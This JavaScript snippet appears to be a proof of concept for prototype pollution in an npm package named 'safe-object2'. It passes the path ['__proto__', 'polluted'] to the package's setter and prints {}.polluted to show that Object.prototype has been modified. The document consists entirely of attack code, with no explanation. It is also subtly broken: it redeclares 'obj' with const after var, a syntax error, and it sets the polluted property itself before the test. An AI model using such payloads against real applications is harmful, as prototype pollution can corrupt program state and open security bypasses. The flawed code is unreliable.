var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const safeObj2 = require('safe-object2');
const obj = safeObj2(obj);
console.log({}.polluted);
obj.setter([
    '__proto__',
    'polluted'
], 'yes');
console.log({}.polluted);